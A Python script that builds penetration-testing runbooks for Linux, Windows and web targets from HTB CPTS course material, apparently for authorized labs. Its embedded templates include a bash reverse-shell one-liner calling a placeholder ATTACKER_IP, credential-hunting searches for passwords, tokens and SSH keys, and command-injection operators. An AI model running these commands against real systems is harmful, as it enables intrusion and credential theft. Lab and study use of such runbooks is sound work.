#!/usr/bin/env python3
"""Assemble seven situation-based runbooks from the local CPTS section dump.

Source section bodies and fenced blocks are copied from dump/. Hand-written
front matter is limited to navigation, user-requested native checks, output
interpretation, safety notes, and routing. Coverage gaps are explicit.
"""
from __future__ import annotations

import json
import re
from dataclasses import dataclass
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DUMP = ROOT / "dump"
OUT = ROOT / "cheatsheets"

SAFETY = """
> **Authorized use only.** These runbooks are for HTB/CPTS labs, CTFs, and systems you have permission to test.
>
> **Safety convention:** commands that restart services, modify permissions/ACLs, overwrite files, install software, or run kernel exploits require deliberate verification first. Prefer read-only confirmation. Replace all CPTS lab IPs, domains, users, passwords, paths, ports, and callback addresses.
>
> **Source convention:** assembled CPTS material is identified by its module and section. A requested topic without operational coverage in this dump is marked **CPTS COVERAGE GAP** rather than filled with unmarked external material.
""".strip()

@dataclass
class Item:
    module: str
    path: Path
    title: str
    anchor: str

def slug(s: str) -> str:
    return re.sub(r"[^a-z0-9]+", "-", s.lower()).strip("-")

def title_of(path: Path) -> str:
    text = path.read_text(encoding="utf-8")
    m = re.search(r"(?m)^#\s+(.+?)\s*$", text)
    return m.group(1).strip() if m else re.sub(r"^\d+_", "", path.stem).replace("_", " ")

def section_files(module: str, include: str | None = None, exclude: str | None = None) -> list[Path]:
    files = sorted((DUMP / module / "sections").glob("*.md"))
    if include:
        rx = re.compile(include, re.I)
        files = [p for p in files if rx.search(title_of(p))]
    if exclude:
        rx = re.compile(exclude, re.I)
        files = [p for p in files if not rx.search(title_of(p))]
    return files

def items_for(specs: list[tuple[str, str | None, str | None]]) -> list[Item]:
    items: list[Item] = []
    seen: set[Path] = set()
    used: dict[str, int] = {}
    for module, include, exclude in specs:
        module_name = json.loads((DUMP / module / "module.json").read_text(encoding="utf-8"))["data"]["name"]
        for path in section_files(module, include, exclude):
            if path in seen:
                continue
            seen.add(path)
            title = title_of(path)
            base = slug(title)
            used[base] = used.get(base, 0) + 1
            anchor = base if used[base] == 1 else f"{base}-{used[base]}"
            items.append(Item(module_name, path, title, anchor))
    return items

def source_body(path: Path) -> str:
    """Remove source title/metadata and demote headings outside code fences."""
    lines = path.read_text(encoding="utf-8").splitlines()
    out: list[str] = []
    fence = False
    skipped_title = False
    for line in lines:
        if re.match(r"^[ \t]{0,3}```(?!`)", line):
            fence = not fence
            out.append(line)
            continue
        if not fence:
            if not skipped_title and re.match(r"^#\s+", line):
                skipped_title = True
                continue
            if line.startswith("> type="):
                continue
            m = re.match(r"^(#{1,4})(\s+.*)$", line)
            if m:
                line = "#" * min(6, len(m.group(1)) + 2) + m.group(2)
        out.append(line)
    return "\n".join(out).strip()

def toc(items: list[Item], fronts: list[str]) -> str:
    lines = ["## Table of contents", ""]
    seen_front: set[str] = set()
    for front in fronts:
        for heading in re.findall(r"(?m)^# \[([^]]+)\]\s*$", front):
            if heading in seen_front:
                continue
            seen_front.add(heading)
            lines.append(f"- [{heading}](#{slug(heading)})")
    for item in items:
        lines.append(f"- [{item.title}](#{item.anchor}) — {item.module}")
    return "\n".join(lines)

def render(title: str, purpose: str, quick: str, routing: str, items: list[Item], gaps: str = "") -> str:
    parts = [f"# {title}", "", purpose.strip(), "", SAFETY, "", toc(items, [quick, routing, gaps]), "", quick.strip(), ""]
    if routing.strip():
        parts += [routing.strip(), ""]
    if gaps.strip():
        parts += [gaps.strip(), ""]
    parts += ["## CPTS source-assembled workflow", "",
              "Work from the top. Each large header begins a source-backed operational subject. Internal CPTS headings, commands, output, interpretations, examples, and failure notes are retained.", ""]
    for item in items:
        parts += ["============================================================", f'<a id="{item.anchor}"></a>', f"# [{item.title.upper()}]", "============================================================", "",
                  f"> CPTS Module: **{item.module}**  ", f"> CPTS Section: **{item.title}**  ", f"> Local source: `{item.path.relative_to(ROOT)}`", "", source_body(item.path), ""]
    return "\n".join(parts).rstrip() + "\n"

LINUX_QUICK = r"""
============================================================
# [0. QUICK START — LINUX]
============================================================

Run on the **target Linux host**. Start read-only and record the output.

```bash
id
whoami
hostname
uname -a
cat /etc/os-release 2>/dev/null
groups
sudo -l
env
ip a
ip route
ss -lntup 2>/dev/null
ps aux
```

High-value first pass:

```bash
# SUID / SGID (full-filesystem searches may be slow)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# File capabilities
getcap -r / 2>/dev/null

# Scheduled execution
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null
systemctl list-timers --all 2>/dev/null

# Mounts, exports, containers, and local-only services
mount
cat /etc/exports 2>/dev/null
test -f /.dockerenv && echo 'Docker marker present'
ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
id
groups
docker ps 2>/dev/null
docker images 2>/dev/null
docker inspect CONTAINER 2>/dev/null
ss -lntup 2>/dev/null
```

Credential triage—scope these before attempting `/` recursively:

```bash
find /home /opt /var/www /srv /usr/local -type f \( -name '*.conf' -o -name '*.config' -o -name '.env' -o -name '*.bak' -o -name '*.old' -o -name '*history*' -o -name 'id_rsa' \) 2>/dev/null
grep -RniE 'pass(word)?|secret|token|api[_-]?key|credential|connectionstring|database_url' /home /opt /var/www /srv /usr/local 2>/dev/null
command -v rg >/dev/null && rg -ni --hidden -g '!*.log' -g '!node_modules/**' 'pass(word)?|secret|token|api[_-]?key|credential|connectionstring|database_url' /home /opt /var/www /srv /usr/local 2>/dev/null
```

### Interpret the first pass

| Finding | Why it matters | Route |
|---|---|---|
| `sudo -l` shows `NOPASSWD`, `SETENV`, `ALL`, scripts, wildcards, or unusual binaries | May execute or influence code as another user/root | Search `/SUDO RIGHTS ABUSE` |
| Unusual SUID/SGID program | Effective UID/GID may be privileged | Search `/SPECIAL PERMISSIONS` |
| `cap_setuid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_admin`, `cap_sys_ptrace` | May change identity, bypass file access, mount, or inspect processes | Search `/CAPABILITIES` |
| Writable root-owned script/unit/binary or writable parent directory | Privileged execution may consume attacker-controlled content | Search `/PATH ABUSE`, `/CRON`, `/SHARED OBJECT` |
| `127.0.0.1:3306`, `:5432`, `:6379`, `:8080` | Local-only database/cache/admin web service | Search `/INTERNAL PORTS` and use the clients below |
| Membership in `docker` or `lxd` | Often grants host-level control through mounts/container management | Search `/DOCKER` or `/LXD` |

### Local service connection syntax

```bash
mysql -h 127.0.0.1 -P 3306 -u USER -p
psql -h 127.0.0.1 -p 5432 -U USER -d DATABASE
redis-cli -h 127.0.0.1 -p 6379
curl -i http://127.0.0.1:8080/
ssh -p 22 USER@127.0.0.1
```

### Common failures

| Symptom | Likely reason | Next check |
|---|---|---|
| `command not found` | Minimal image or PATH restriction | `type CMD`; `which CMD`; try `/usr/bin/CMD`; use native alternative |
| `Permission denied` | Missing execute/read permission, `noexec`, ACL, or policy | `ls -la`; `stat FILE`; `namei -l FILE`; `getfacl FILE`; `mount` |
| Process/port owner missing | Non-root cannot see all details | Correlate `ss`, `ps`, configs, `/proc`; rerun after privilege gain |
| Recursive search hangs/noisy | Large mounts, `/proc`, logs, vendor trees | Search `/home /opt /var/www /srv /usr/local`; use `-xdev`; exclude noisy paths |
"""

LINUX_ROUTING = r"""
## Linux decision route

```text
Shell as low-privileged user
  ├─ credentials/history/keys found → reuse locally, SSH, database, or application account
  ├─ sudo rule found              → inspect command, arguments, target user, environment, and writable dependencies
  ├─ SUID/capability found        → compare normal vs unusual binary; inspect calls and relative paths
  ├─ cron/systemd found           → identify executor, writable script/binary/config/parent, restart/trigger condition
  ├─ local-only port found        → connect locally; search matching configs and credentials
  ├─ docker/lxd/NFS found         → inspect group membership, socket/exports, host mounts
  └─ nothing found               → processes, installed versions, automated enumeration, then kernel last
```

============================================================
# [SYSTEM INFORMATION / USER / ENVIRONMENT]
============================================================

```bash
id; whoami; groups
hostname; uname -a
cat /etc/os-release 2>/dev/null
env
cat /etc/passwd
getent passwd 2>/dev/null
```

Look for unexpected groups, additional interactive users, service accounts with shells, credentials in environment variables, unusual `PATH` entries, and versions that match later application/kernel checks.

============================================================
# [SHELL HISTORY / SSH KEYS]
============================================================

```bash
find /home /root -maxdepth 3 -type f \( -name '.*history' -o -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' -o -name 'known_hosts' \) -ls 2>/dev/null
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
ls -la ~/.ssh 2>/dev/null
```

Private keys require correct permissions before SSH accepts them:

```bash
chmod 600 KEY
ssh -i KEY USER@HOST
```

============================================================
# [SUID / SGID FAST ROUTE]
============================================================

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Standard entries are less interesting than custom/unusual binaries. For each candidate:

```bash
ls -la BINARY
file BINARY
strings BINARY | less
ltrace BINARY 2>/dev/null
strace -f BINARY 2>&1 | less
```

Look for relative program names, attacker-controlled files/configuration, unsafe library loading, and calls whose behavior changes under the effective UID. `ltrace`/`strace` may be absent or restricted.

============================================================
# [SYSTEMD SERVICES]
============================================================

```bash
systemctl list-units --type=service --all
systemctl list-unit-files
systemctl status SERVICE
systemctl cat SERVICE
systemctl show SERVICE -p User -p Group -p ExecStart -p WorkingDirectory -p Environment -p EnvironmentFiles
systemctl list-timers --all
```

Inspect every referenced path and every parent directory:

```bash
ls -la /path/to/unit /path/to/executable /path/to/script /path/to/environment-file
namei -l /path/to/executable
```

| Finding | Applicability condition |
|---|---|
| Writable unit | Need systemd to reload it and the service/timer to start as a privileged identity |
| Writable `ExecStart` script/binary | Privileged service must execute that exact attacker-controlled path |
| Writable parent directory | May replace/rename a protected-looking child if directory permissions allow |
| Writable `EnvironmentFile` | Program must consume an influenceable variable unsafely |
| Relative command/path | Service environment and search path must resolve attacker-controlled content |
| Root service, writable working/config directory | Program must load executable code/config from that location |

**Potentially disruptive:** `systemctl daemon-reload`, service restart, and unit modification change system state. First establish write access, execution identity, and an authorized trigger/restart path. If restart is denied, check timers, automatic failure restart, normal application triggers, or an authorized reboot window.

============================================================
# [RUNNING PROCESSES / INTERNAL PORTS]
============================================================

```bash
ps auxww
ps -ef
ss -lntup 2>/dev/null
netstat -lntup 2>/dev/null
```

Correlate process command lines, listening addresses, configuration paths, and credentials. A service bound only to `127.0.0.1` or `::1` is unreachable externally but directly reachable from the shell. Search its process/application name in `/etc`, `/opt`, `/var/www`, `/srv`, and `/usr/local`.

============================================================
# [SHARED LIBRARIES / LD_PRELOAD / LD_LIBRARY_PATH]
============================================================

```bash
ldd /path/to/binary
readelf -d /path/to/binary 2>/dev/null
ldconfig -p 2>/dev/null
echo "$LD_PRELOAD"
echo "$LD_LIBRARY_PATH"
```

Applicability requires a privileged program to load a library from an attacker-writable location or a sudo rule that preserves/permits the relevant environment variable. Secure-execution behavior often strips dangerous loader variables. Search the source-backed `/SHARED LIBRARIES`, `/SHARED OBJECT HIJACKING`, and `/SUDO RIGHTS ABUSE` sections before modifying anything.

============================================================
# [NFS]
============================================================

Target checks:

```bash
cat /etc/exports 2>/dev/null
mount | grep -i nfs
```

Attacker checks:

```bash
showmount -e TARGET
```

Look for writable exports and `no_root_squash`. Exploitability depends on export options, client restrictions, UID mapping, mount access, and a privileged execution path; do not assume every writable export gives root.

============================================================
# [AUTOMATED ENUMERATION]
============================================================

Use automation after the native first pass so you can interpret its findings. CPTS commonly uses tools such as LinPEAS, LinEnum, and `pspy`. Review scripts before execution, transfer them with `FILE_TRANSFER.md`, and avoid blindly running tools on sensitive production systems.

============================================================
# [CREDENTIAL REUSE]
============================================================

```bash
su - USER
ssh USER@127.0.0.1
ssh USER@HOST
mysql -h 127.0.0.1 -u USER -p
psql -h 127.0.0.1 -U USER -d DATABASE
```

```text
Config/history/key/database secret
  → identify owner and service
  → validate locally with the least intrusive client
  → test same identity against SSH/database/application where justified
  → rerun id/groups/sudo/process/credential enumeration as the new user
```

============================================================
# [FINAL CHECKLIST — LINUX]
============================================================

- Identity, groups, environment, OS/kernel and network recorded.
- Home directories, histories, SSH keys, configs, backups, Git and web roots checked.
- `sudo`, SUID/SGID, capabilities, ACLs and writable parent directories reviewed.
- Cron, timers, systemd/init, processes and local-only ports correlated.
- PATH, wildcards, shared objects, loader variables and Python imports reviewed where privileged execution exists.
- Docker/LXD/container markers, sockets, mounts, NFS and privileged groups checked.
- Installed/custom software and credentials reused only against justified services.
- Automated enumeration reviewed; kernel/version exploits considered last with crash risk understood.
"""

WINDOWS_QUICK = r"""
============================================================
# [0. QUICK START — WINDOWS]
============================================================

Run on the **target Windows host**. Use both shells where available.

```cmd
whoami
whoami /all
whoami /priv
hostname
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /v
net user
net localgroup administrators
cmdkey /list
```

```powershell
$env:USERNAME
Get-ComputerInfo
Get-LocalUser
Get-LocalGroupMember Administrators
Get-Process
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
Get-ScheduledTask
Get-NetTCPConnection -State Listen
Get-MpComputerStatus
```

### Permission syntax you must recognize

| `icacls` right | Meaning |
|---|---|
| `F` | Full control |
| `M` | Modify |
| `RX` | Read and execute |
| `W` | Write |
| `WD` | Write data/add file |
| `AD` | Append data/add subdirectory |

```cmd
icacls "C:\Path\To\File.exe"
icacls "C:\Path\To\Directory"
sc query
sc qc SERVICE
schtasks /query /fo LIST /v
reg query HKLM /f password /t REG_SZ /s
```

### Interpret `whoami /priv`

| Privilege | Immediate route |
|---|---|
| `SeImpersonatePrivilege` | Token impersonation; search `/SEIMPERSONATE` |
| `SeAssignPrimaryTokenPrivilege` | Create a process with an assigned token; search `/SEASSIGNPRIMARYTOKEN` |
| `SeBackupPrivilege` | Read protected files/registry using backup semantics |
| `SeRestorePrivilege` | Write/restore protected resources; modification is intrusive |
| `SeTakeOwnershipPrivilege` | Take ownership, then inspect/modify ACLs; intrusive |
| `SeDebugPrivilege` | Inspect privileged processes and credentials; high impact |

### Map a listening port to its process

```cmd
netstat -ano
tasklist /fi "PID eq PID_NUMBER"
```

```powershell
Get-NetTCPConnection -State Listen | Sort-Object LocalPort
Get-Process -Id PID_NUMBER
```

### Common failures

| Symptom | Likely reason | Next check |
|---|---|---|
| `Access is denied` | Missing ACL/service/token privilege or elevated shell | `whoami /all`; `icacls`; service/task owner; integrity level |
| Cannot restart service | No service-control right | Check auto-restart, task trigger, reboot scope; do not reboot without authorization |
| PowerShell script blocked | Execution policy, constrained language, AMSI/AV | Use native `cmd`, CIM/WMI, registry and `sc`; inspect `$ExecutionContext.SessionState.LanguageMode` |
| Executable disappears | Defender/EDR quarantine | Prefer native/manual checks; inspect Defender status and logs if permitted |
| Payload will not run | Architecture/runtime mismatch | `systeminfo`; process architecture; required .NET/runtime; file blocked status |
"""

WINDOWS_ROUTING = r"""
## Windows decision route

```text
Low-privileged Windows shell
  ├─ dangerous token privilege → open matching Se* section
  ├─ custom service            → inspect account, executable path, file/dir ACL, service ACL, registry, restart trigger
  ├─ scheduled task            → inspect principal/run level/action and writable dependencies
  ├─ credentials/artifacts     → cmdkey, history, configs, web.config, unattended files, registry, DPAPI
  ├─ local-only service        → map PID → process → config/credentials/client
  └─ nothing found             → installed software, groups, automated enumeration, patch/kernel last
```

============================================================
# [SYSTEM INFORMATION / CURRENT USER]
============================================================

```cmd
whoami
whoami /user
whoami /groups
whoami /priv
hostname
systeminfo
set
```

Record integrity level, local/domain identity, enabled privileges, interesting groups, OS build/architecture, domain/workgroup, environment paths, and hotfix information.

============================================================
# [POWERSHELL HISTORY]
============================================================

```powershell
(Get-PSReadLineOption).HistorySavePath
Get-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Get-ChildItem C:\Users -Force -Recurse -ErrorAction SilentlyContinue -Filter ConsoleHost_history.txt
```

Look for commands containing credentials, mapped shares, remote hosts, database clients, deployment scripts, and administrative actions.

============================================================
# [DPAPI ROUTE]
============================================================

Common user paths:

```cmd
dir /a %APPDATA%\Microsoft\Protect\%SID%
dir /a %LOCALAPPDATA%\Microsoft\Credentials
dir /a %APPDATA%\Microsoft\Credentials
cmdkey /list
```

DPAPI protects masterkeys and credential blobs using material tied to the user logon/domain context. A blob alone is not necessarily decryptable: correlate the user SID, masterkey, current logon context, password/NT hash/domain backup key, and the application that created it. See the source-backed credential-theft sections for tooling and prerequisites.

============================================================
# [RUNNING PROCESSES / INTERNAL PORTS]
============================================================

```cmd
tasklist /v
netstat -ano
tasklist /fi "PID eq PID_NUMBER"
wmic process get ProcessId,ParentProcessId,ExecutablePath,CommandLine
```

```powershell
Get-Process
Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,ExecutablePath,CommandLine
Get-NetTCPConnection -State Listen | Sort-Object LocalPort
```

Local-only database, web-admin, backup, or management ports can expose credentials or privileged functionality. Map port → PID → executable/service → configuration and service account.

============================================================
# [UNQUOTED SERVICE PATHS]
============================================================

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
sc qc SERVICE
```

An unquoted path is exploitable only when it contains spaces, Windows will test an earlier executable candidate, you can create that candidate, and the service runs with higher privilege and can be triggered/restarted. Verify each directory with `icacls`; do not drop a binary until the search order and trigger are confirmed.

============================================================
# [SCHEDULED TASKS]
============================================================

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | ForEach-Object {
  $t = $_
  $t.Actions | Select-Object @{n='Task';e={$t.TaskName}},Execute,Arguments,WorkingDirectory
}
```

For a candidate, record the principal/user, run level, action executable/script, arguments, working directory, trigger, last/next run, and ACLs on every referenced path and parent. A writable script/binary matters only if the task runs it under a more privileged identity. Task modification or forced execution changes system state.

============================================================
# [ALWAYSINSTALLELEVATED]
============================================================

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both values must be enabled for the classic elevated MSI condition. Installing an MSI modifies the system and is noisy; confirm both registry values before preparing any package.

============================================================
# [SEBACKUP / SERESTORE]
============================================================

```cmd
whoami /priv
```

`SeBackupPrivilege` can enable reads using backup semantics; `SeRestorePrivilege` can enable protected writes/restores. Applicability depends on the privilege being present/enabled and using an API/tool that requests backup/restore semantics. Prefer a read-only proof. Registry hive saves, ACL changes, and protected-file replacement are sensitive state-changing actions.

============================================================
# [WINDOWS DEFENDER / SECURITY PRODUCTS]
============================================================

```powershell
Get-MpComputerStatus
Get-MpPreference
Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
```

Do not disable protections. If tooling is quarantined or blocked, fall back to native commands, PowerShell/CIM, `sc`, `reg`, `icacls`, and manual inspection. Record the control encountered as part of the lab/assessment evidence.

============================================================
# [AUTOMATED ENUMERATION]
============================================================

CPTS references WinPEAS, PowerUp, Seatbelt, SharpUp, and related tools. Run native checks first, choose a tool compatible with target architecture/runtime, review its output rather than trusting severity labels, and expect AV/EDR controls. Transfer syntax is in `FILE_TRANSFER.md`.

============================================================
# [FINAL CHECKLIST — WINDOWS]
============================================================

- Identity, groups, integrity level, privileges, OS build, network and security controls recorded.
- Local users/admins, environment, histories, saved credentials, configs, unattended files, IIS/database files and registry reviewed.
- DPAPI/SAM/SYSTEM/SECURITY/LSASS paths considered only with the necessary access and least-impact proof.
- Processes and listening ports mapped to executable, service, account and configuration.
- Custom services checked for account, path quoting, file/directory ACL, service ACL, registry ACL, DLL/path search and restart trigger.
- Scheduled tasks checked for principal, action, arguments, working directory, ACLs and trigger.
- AlwaysInstallElevated and dangerous Se* privileges routed to their applicability checks.
- Built-in/interesting groups, installed software, automated enumeration and patch/kernel paths reviewed.
- Every new credential or user context triggers a complete re-enumeration.
"""

WEB_QUICK = r"""
============================================================
# [0. QUICK START — WEB]
============================================================

Run from the **attacker host** unless noted.

```bash
nmap -sC -sV -p80,443,8000,8080,8443 TARGET
curl -i http://TARGET/
curl -k -i https://TARGET/
curl -IL http://TARGET/
whatweb http://TARGET/
openssl s_client -connect TARGET:443 -servername HOSTNAME </dev/null
```

If a hostname appears in a redirect, certificate, page source, or error:

```bash
echo 'TARGET_IP HOSTNAME' | sudo tee -a /etc/hosts
curl -i http://HOSTNAME/
```

Basic discovery:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://HOST/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://HOST/FUZZ
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://HOST/ -H 'Host: FUZZ.HOST' -fs BASELINE_SIZE
feroxbuster -u http://HOST/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://HOST/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Replace `TARGET`, `TARGET_IP`, `HOST`, `HOSTNAME`, `FUZZ`, and `BASELINE_SIZE`. Establish the baseline with one nonexistent path/host before filtering.

### FFUF troubleshooting

| Symptom | Likely reason | What to try |
|---|---|---|
| Every word matches | Wildcard response or custom error page | Compare sizes/words/lines; use `-fs`, `-fw`, or `-fl` with the baseline |
| Empty output | Wrong host/scheme/path, aggressive filter, TLS issue | Remove filters; `curl -i`; add `-k`; verify redirects and Host header |
| Too many 301/302 results | Redirecting unknown paths/hosts | Inspect `Location`; filter baseline size or status with `-fc` |
| Rate limiting/timeouts | Too much concurrency | Lower `-t`; add `-rate`; increase `-timeout`; use a smaller list |
| Need Burp visibility | Direct traffic bypasses proxy | Add `-x http://127.0.0.1:8080` |
"""

WEB_ROUTING = r"""
## Web routing table — what did I observe?

| Observable clue | Think about | Search header |
|---|---|---|
| `file=`, `path=`, `page=`, `document=` | Traversal, LFI, source disclosure | `/LOCAL FILE INCLUSION`, `/PHP FILTERS` |
| `template=` or template syntax | SSTI possibility; distinguish reflection from evaluation | `/SSTI` coverage notice |
| `url=`, `uri=`, `callback=`, `webhook=`, remote image fetch | SSRF, redirect behavior, internal services | `/SSRF` and `/REMOTE FILE INCLUSION` |
| `id=`, `uid=`, `account_id=`, UUID, nested API resource | IDOR/BOLA; compare two controlled accounts | `/INTRO TO IDOR`, `/MASS IDOR` |
| `cmd=`, `host=`, `ip=`, ping/lookup feature | OS command injection | `/COMMAND INJECTIONS`, `/INJECTING COMMANDS` |
| XML/SOAP or `application/xml` | XXE if external entities/DTD processing is enabled | `/INTRO TO XXE`, `/BLIND DATA EXFILTRATION` |
| `multipart/form-data`, `filename=`, upload UI/API | Upload validation and storage/execution path | `/FILE UPLOAD` |
| Search/filter/sort/login input changes query behavior | SQL injection; possibly NoSQL but CPTS coverage differs | `/SQL INJECTIONS`, `/SQLMAP` |
| `{{ }}`, `${ }`, `<%= %>`, `#{}` evaluates mathematically | SSTI rather than simple reflection/XSS | `/SSTI` coverage notice |
| Token begins `eyJ` | JWT-shaped Base64URL token; inspect auth/session boundary | `/JWT` coverage notice |
| Encoded/serialized object | Deserialization possibility | `/DESERIALIZATION` coverage notice |
| API accepts owner/role/admin fields | Mass assignment and authorization testing | `/MASS ASSIGNMENT`, `/IDOR` |

## Web execution order

```text
HTTP snapshot → hostname/TLS/vhosts → technology/version → crawl/fuzz/files/parameters
→ source/JavaScript → authentication/session → authorization/IDOR/verbs
→ route each input by context → file read/credentials/RCE → listener → stable shell
```

## Burp minimum workflow

1. Proxy the browser and confirm the target is in scope.
2. Keep one original request, then send copies to Repeater.
3. Change one variable at a time: unauthenticated vs authenticated, account A vs account B, method, object ID, content type, and body field.
4. Record status, length, redirect, response body, timing, and server-side effect.
5. Use Intruder only after establishing a small controlled payload position and respecting lab rate limits.

============================================================
# [WEB → SHELL QUICK REFERENCE]
============================================================

Listener on the attacker:

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

Common CPTS-style Linux callback:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

After connection, search `/SPAWNING INTERACTIVE SHELLS` below or open `SHELLS.md`. Verify egress, listener address, quoting, binary availability, and whether the vulnerable process runs Linux or Windows.

============================================================
# [TLS / HOSTNAME DISCOVERY]
============================================================

```bash
curl -k -I https://TARGET/
openssl s_client -connect TARGET:443 -servername HOSTNAME </dev/null
echo | openssl s_client -connect TARGET:443 -servername HOSTNAME 2>/dev/null | openssl x509 -noout -subject -issuer -ext subjectAltName
dig @DNS_SERVER HOSTNAME
host HOSTNAME DNS_SERVER
```

Extract redirect hosts, certificate CN/SAN names, cookie domains, absolute links, error-page hostnames, and virtual-host differences. Add confirmed lab names to `/etc/hosts`; avoid treating every certificate name as live without resolving/testing it.

============================================================
# [FILE / EXTENSION / PARAMETER FUZZING]
============================================================

```bash
ffuf -w FILE_WORDLIST -u http://HOST/FUZZ
ffuf -w NAME_WORDLIST -u http://HOST/FUZZ -e .php,.txt,.html,.bak,.old,.zip
ffuf -w PARAM_WORDLIST -u 'http://HOST/page.php?FUZZ=test' -fs BASELINE_SIZE
ffuf -w VALUE_WORDLIST -u 'http://HOST/page.php?param=FUZZ' -fs BASELINE_SIZE
ffuf -w PARAM_WORDLIST -u http://HOST/endpoint -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs BASELINE_SIZE
ffuf -w WORDLIST -u http://HOST/FUZZ -b 'session=COOKIE' -H 'Authorization: Bearer TOKEN' -x http://127.0.0.1:8080
```

Useful controls: `-mc` match status, `-fc` filter status, `-fs` filter size, `-fw` filter words, `-fl` filter lines, `-t` threads, `-rate` requests/second, `-recursion`, `-recursion-depth`, `-k` ignore TLS validation. Always compare a known-nonexistent baseline before filtering.

============================================================
# [BACKUPS / GIT / SOURCE / JAVASCRIPT REVIEW]
============================================================

```bash
curl -i http://HOST/robots.txt
curl -i http://HOST/sitemap.xml
curl -i http://HOST/.git/HEAD
wget -qO- http://HOST/ | grep -Eoi "src=['\"][^'\"]+\.js[^'\"]*"
```

After downloading source/JavaScript into a local directory:

```bash
rg -ni 'fetch\(|axios|XMLHttpRequest|WebSocket|/api/|graphql|admin|debug|token|jwt|api[_-]?key|secret|internal|sourceMappingURL|\.map' .
rg -no "https?://[^'\"[:space:]]+|/[A-Za-z0-9_./?=&-]+" .
```

Search for endpoints, parameters, methods, API versions, source maps, internal hosts, debug/admin routes, feature flags, credentials/tokens, WebSockets, and client-side authorization assumptions. A client-side secret may be public by design; validate its server-side privilege before treating it as a credential.

============================================================
# [USERNAME / PASSWORD / AUTHENTICATION ROUTE]
============================================================

1. Compare controlled valid/invalid usernames by status, body, length, timing, redirect, and reset behavior.
2. Determine password policy and lockout/rate-limit behavior before spraying or brute forcing.
3. Check documented/default credentials only when justified by the identified product/version.
4. Use two controlled accounts for session, role, and authorization boundaries.
5. Test logout invalidation, cookie rotation after login, remember-me behavior, password reset token binding/expiry, and MFA step binding.

Hydra examples and login-form field construction are retained in the source-backed `/HYDRA`, `/BASIC HTTP AUTHENTICATION`, and `/LOGIN FORMS` sections. Capture the real request first; field names, failure string, CSRF tokens, cookies, and redirects are application-specific.

============================================================
# [PATH TRAVERSAL ROUTE]
============================================================

```text
file/path/page/document parameter
  → establish normal value and expected base directory
  → test a harmless known file using relative and absolute syntax appropriate to target OS
  → observe content vs blank/error/download/redirect
  → inspect normalization, extension appending and encoding
  → if source is readable, prioritize application config and credentials
```

Linux high-value reads covered by the LFI material include `/etc/passwd`, application source/config, `.env`, web-server configuration/logs, user SSH material when permissions allow, and process/environment information. Windows targets use Windows paths and IIS/application configuration such as `web.config`; search the full LFI sections for concrete payloads and bypasses.

============================================================
# [COMMAND INJECTION ROUTE]
============================================================

Linux-relevant separators/operators:

```text
;
&&
||
|
newline
$()
backticks
```

Windows command chaining differs; determine whether the backend invokes `cmd.exe`, PowerShell, or a Unix shell. Confirm with harmless output or timing before requesting a callback. Reflection alone is not execution. The source-backed Command Injections module below includes exact operators, filters, space/character/command bypasses, obfuscation, and tooling.

============================================================
# [CMS / FRAMEWORK ROUTE]
============================================================

Fingerprint product, version, plugins/modules/themes, exposed administrative paths, documentation/readme files, and authentication before exploit research. Dedicated source-backed sections below cover WordPress, Joomla, Drupal, Tomcat, Jenkins, Splunk, PRTG, GitLab, osTicket, CGI/Shellshock, ColdFusion, IIS tilde enumeration, LDAP-connected applications, and thick clients.

============================================================
# [FINAL CHECKLIST — WEB]
============================================================

- Scheme, ports, redirects, headers, TLS names, hostnames, DNS and virtual hosts recorded.
- Technology/product/version and error behavior fingerprinted without relying on one tool.
- Crawling plus directory/file/extension/recursive/parameter fuzzing completed with baseline-aware filters.
- `robots.txt`, sitemap, well-known paths, backups, VCS exposure, source maps, source and JavaScript reviewed.
- Authentication, reset, MFA, sessions/cookies and role boundaries checked with controlled accounts.
- Object-level and function-level authorization tested across path/query/JSON/nested identifiers and HTTP verbs.
- Every input routed by context: file/path, URL fetch, command-like, SQL-like, XML, upload, reflected client input, or API object.
- File read converted into source/config/credential discovery; credentials validated minimally and reused only where justified.
- RCE path verified, listener prepared, shell stabilized, and the appropriate privilege-escalation runbook opened.
"""

WEB_GAPS = r"""
## Requested web topics with CPTS coverage limits

============================================================
# [SSTI]
============================================================

**CPTS COVERAGE GAP:** the 28-module dump contains no SSTI teaching section or operational SSTI payload set. The routing table preserves the clue, but this file does not invent engine-specific exploitation commands.

Use the safe distinction: literal reflection suggests ordinary output/XSS context; evaluated arithmetic/template syntax suggests server-side template evaluation. Identify the server language/framework before selecting any engine-specific test.

============================================================
# [NOSQL INJECTION]
============================================================

**CPTS COVERAGE GAP:** no operational NoSQL injection section exists in this dump.

============================================================
# [JWT]
============================================================

**CPTS COVERAGE GAP:** the dump discusses session/authentication concepts but does not provide a dedicated JWT attack workflow.

============================================================
# [DESERIALIZATION]
============================================================

